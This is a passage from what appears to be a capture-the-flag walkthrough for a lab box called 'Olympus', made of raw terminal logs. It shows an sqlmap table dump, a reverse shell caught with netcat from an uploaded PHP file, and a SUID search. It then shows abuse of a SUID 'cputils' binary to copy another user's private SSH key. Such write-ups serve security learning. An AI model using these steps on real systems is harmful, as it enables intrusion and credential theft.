| 47c3210d51761686f3af40a875eeaaea.txt |
| 1505fa8a8d00136243bd333c44118103.php |
|
|
|
+--------------------------------------+

[17:39:15] [INFO] table 'olympus.chats' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
[17:39:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 17:39:15 //

go to http://chat.olympus.thm/uploads/1505fa8a8d00136243bd333c44118103.php

revshell

┌──(witty㉿kali)-[/tmp]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.222.120] 58404
SOCKET: Shell has connected! PID: 1227
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ find / -perm -u=s -type f 2>/dev/null
<html/uploads$ find / -perm -u=s -type f 2>/dev/null            
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils

www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ls -lah /usr/bin/cputils
<s.thm/public_html/uploads$ ls -lah /usr/bin/cputils            
-rwsr-xr-x 1 zeus zeus 18K Apr 18  2022 /usr/bin/cputils

www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ cd /home
cd /home
www-data@olympus:/home$ ls
ls
zeus
www-data@olympus:/home$ cd zeus
cd zeus
www-data@olympus:/home/zeus$ ls -lah
ls -lah
total 48K
drwxr-xr-x 7 zeus zeus 4.0K Apr 19  2022 .
drwxr-xr-x 3 root root 4.0K Mar 22  2022 ..
lrwxrwxrwx 1 root root    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus 3.7K Feb 25  2020 .bashrc
drwx------ 2 zeus zeus 4.0K Mar 22  2022 .cache
drwx------ 3 zeus zeus 4.0K Apr 14  2022 .gnupg
drwxrwxr-x 3 zeus zeus 4.0K Mar 23  2022 .local
-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
drwx------ 2 zeus zeus 4.0K Apr 14  2022 .ssh
-rw-r--r-- 1 zeus zeus    0 Mar 22  2022 .sudo_as_admin_successful
drwx------ 3 zeus zeus 4.0K Apr 14  2022 snap
-rw-rw-r-- 1 zeus zeus   34 Mar 23  2022 user.flag
-r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt
www-data@olympus:/home/zeus$ cd .ssh
cd .ssh
bash: cd: .ssh: Permission denied

www-data@olympus:/home/zeus$ cat zeus.txt
cat zeus.txt
Hey zeus !

I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.

						- Prometheus.

www-data@olympus:/home/zeus$ /usr/bin/cputils
/usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: ./.ssh/id_rsa
./.ssh/id_rsa

Enter the Name of Target File: id_rsa
id_rsa

File copied successfully.
www-data@olympus:/home/zeus$ ls
ls
id_rsa	snap  user.flag  zeus.txt
